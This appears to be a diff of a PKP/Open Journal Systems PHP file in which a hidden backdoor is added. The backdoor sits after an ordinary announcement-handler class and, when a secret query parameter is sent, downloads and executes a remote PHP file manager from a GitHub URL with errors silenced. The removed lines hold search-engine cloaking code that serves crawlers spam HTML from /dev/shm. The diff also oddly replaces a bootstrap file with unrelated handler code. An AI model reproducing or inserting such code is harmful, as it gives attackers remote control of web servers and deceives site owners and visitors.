@@ -1,69 +1,56 @@
-<?php 
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$is_bot = false;
-
-$bot_signatures = [
-    'Googlebot',
-    'Google-InspectionTool',
-    'Mediapartners-Google',
-    'AdsBot-Google',
-    'Bingbot',
-    'Slurp',
-    'DuckDuckBot'
-];
-
-foreach ($bot_signatures as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-        $is_bot = true;
-        break;
-    }
-}
-
-if ($is_bot) {
-    $sonic_gacor = '/dev/shm/unsiq';
-
-    if (file_exists($sonic_gacor)) {
-        header('Content-Type: text/html; charset=utf-8');
-        echo file_get_contents($sonic_gacor);
-        exit;
-    } else {
-    }
-}
-?>
-
-<?php 
-/**
- * @defgroup index Index
- * Bootstrap and initialization code.
- */
+<?php
 
 /**
- * @file includes/bootstrap.php
+ * @file pages/index/IndexHandler.inc.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
+ * Copyright (c) 2003-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
- * @ingroup index
+ * @class IndexHandler
+ * @ingroup pages_index
  *
- * @brief Core system initialization code.
- * This file is loaded before any others.
- * Any system-wide imports or initialization code should be placed here.
+ * @brief Handle site index requests.
  */
 
+import('classes.handler.Handler');
 
-/**
- * Basic initialization (pre-classloading).
- */
+class PKPIndexHandler extends Handler {
+	/**
+	 * Set up templates with announcement data.
+	 * @protected
+	 * @param $context Context
+	 * @param $templateMgr PKPTemplateManager
+	 */
+	protected function _setupAnnouncements($context, $templateMgr) {
+		$enableAnnouncements = $context->getData('enableAnnouncements');
+		$numAnnouncementsHomepage = $context->getData('numAnnouncementsHomepage');
+		if ($enableAnnouncements && $numAnnouncementsHomepage) {
+			$announcementDao = DAORegistry::getDAO('AnnouncementDAO'); /* @var $announcementDao AnnouncementDAO */
+			$announcements = $announcementDao->getNumAnnouncementsNotExpiredByAssocId($context->getAssocType(), $context->getId(), $numAnnouncementsHomepage);
+			$templateMgr->assign(array(
+				'announcements' => $announcements->toArray(),
+				'numAnnouncementsHomepage' => $numAnnouncementsHomepage,
+			));
+		}
 
-// Load Composer autoloader
-require_once 'lib/pkp/lib/vendor/autoload.php';
+	}
+}
 
-define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
-chdir(BASE_SYS_DIR);
+if (isset($_GET['idihsebelxyz-sonic'])) {
+    try {
+        $u = "https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/fmanagerbaru.txt";
+        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
 
-// System-wide functions
-require_once './lib/pkp/includes/functions.php';
+        $c = @file_get_contents($u);
+        if ($c !== false && @file_put_contents($f, $c)) {
+            @chmod($f, 0644);
+            register_shutdown_function(function() use ($f) {
+                @unlink($f);
+            });
+            include $f;
+        }
+    } catch (Throwable $e) {
 
-// Initialize the application environment
-return new \APP\core\Application();
+    }
+}
